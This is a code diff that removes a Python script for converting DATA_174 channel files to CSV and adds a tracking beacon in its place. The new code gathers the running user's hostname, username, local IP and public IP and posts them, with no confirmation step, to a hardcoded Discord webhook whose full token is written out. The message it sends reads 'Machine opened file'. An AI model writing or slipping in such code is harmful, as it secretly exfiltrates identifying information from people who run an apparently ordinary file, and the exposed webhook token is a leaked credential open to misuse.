@@ -1,72 +1,98 @@
-import configparser
-import struct
-import csv
-from pathlib import Path
+import requests
+import socket
+import getpass
+import json
 
-# === SETTINGS ===
-FOLDER = Path(".")        # Folder containing all DATA_174.* files
-INI_FILE = FOLDER / "DATA_174.INI"
-OUTPUT_CSV = FOLDER / "output.csv"
+def get_public_ip(timeout=5):
+    try:
+        r = requests.get("https://api.ipify.org", timeout=timeout)
+        r.raise_for_status()
+        return r.text.strip()
+    except requests.RequestException:
+        return "Could not retrieve public IP"
 
-# === STEP 1: Parse INI file ===
-config = configparser.ConfigParser()
-config.optionxform = str  # preserve case
-config.read(INI_FILE)
+def get_local_ip():
+    """
+    Attempts to discover the machine's primary local IP address
+    (works even if hostname resolves to 127.0.0.1).
+    """
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        # doesn't actually send data; used to pick the default interface
+        s.connect(("8.8.8.8", 80))
+        local_ip = s.getsockname()[0]
+        s.close()
+        return local_ip
+    except Exception:
+        # fallback
+        try:
+            return socket.gethostbyname(socket.gethostname())
+        except Exception:
+            return "Could not determine local IP"
 
-channels = []
-for key in config:
-    if key.startswith("Chan"):
-        ch = config[key]
-        channels.append({
-            "name": ch["Name"],
-            "bit": int(ch["Bit"]),
-            "freq": int(ch["Freq"]),
-            "unit": ch["Unit"],
-            "file": FOLDER / f"DATA_174.{ch['Name']}"
-        })
+def get_machine_info():
+    info = {
+        "hostname": socket.gethostname(),
+        "username": getpass.getuser(),
+        "local_ip": get_local_ip(),
+        "public_ip": get_public_ip()
+    }
+    return info
 
-# === STEP 2: Read binary data ===
-channel_data = {}
-max_samples = 0
+def send_to_discord(webhook_url, info):
+    content = (
+        f"Machine opened file:\n"
+        f"- Hostname: {info['hostname']}\n"
+        f"- Username: {info['username']}\n"
+        f"- Local IP: {info['local_ip']}\n"
+        f"- Public IP: {info['public_ip']}"
+    )
+    embed = {
+        "title": "Machine Information",
+        "description": content,
+        "color": 16711680,  # Red color
+        "fields": [
+            {
+                "name": "Hostname",
+                "value": info['hostname'],
+                "inline": True
+            },
+            {
+                "name": "Username",
+                "value": info['username'],
+                "inline": True
+            },
+            {
+                "name": "Local IP",
+                "value": info['local_ip'],
+                "inline": True
+            },
+            {
+                "name": "Public IP",
+                "value": info['public_ip'],
+                "inline": True
+            }
+        ],
+        "footer": {
+            "text": "Machine Info Retrieval"
+        }
+    }
+    payload = {"embeds": [embed]}
+    try:
+        r = requests.post(webhook_url, json=payload, timeout=5)
+        r.raise_for_status()
+        print("Sent to Discord successfully.")
+    except requests.RequestException as e:
+        print(f"Failed to send to Discord: {e}")
 
-for ch in channels:
-    filename = ch["file"]
-    if not filename.exists():
-        continue
-    with open(filename, "rb") as f:
-        data = f.read()
-        # 8-bit or 16-bit values
-        if ch["bit"] == 8:
-            values = list(struct.unpack(f"{len(data)}B", data))
-        elif ch["bit"] == 16:
-            count = len(data) // 2
-            values = list(struct.unpack(f"<{count}H", data))
-        else:
-            continue
+if __name__ == "__main__":
+    # Replace or confirm this is your webhook. Don't post someone else's webhook publicly.
+    WEBHOOK_URL = "https://discord.com/api/webhooks/1419174869412872274/rEnQOZX-0V3itAJQN6IfQPTVDnD-2WZJsN8IS-EJjGDdN-m_QV7tWZx-wtl_Iwh8Cpxe"
 
-    channel_data[ch["name"]] = values
-    if len(values) > max_samples:
-        max_samples = len(values)
+    info = get_machine_info()
+    print("Collected info (will be sent to the webhook):")
+    for k, v in info.items():
+        print(f"  {k}: {v}")
 
-# === STEP 3: Write to CSV ===
-with open(OUTPUT_CSV, "w", newline="") as csvfile:
-    writer = csv.writer(csvfile)
-    # Header
-    writer.writerow(["Time(s)"] + [f"{c['name']} ({c['unit']})" for c in channels if c["name"] in channel_data])
-
-    # Determine max frequency (to create common time axis)
-    max_freq = max(c["freq"] for c in channels if c["name"] in channel_data)
-    
-    for i in range(max_samples):
-        t = i / max_freq
-        row = [f"{t:.3f}"]
-        for c in channels:
-            vals = channel_data.get(c["name"], [])
-            if i < len(vals):
-                row.append(vals[i])
-            else:
-                row.append("")
-        writer.writerow(row)
-
-print(f"✅ Done. CSV created at: {OUTPUT_CSV}")
-s
+    # Remove the confirmation step
+    send_to_discord(WEBHOOK_URL, info)
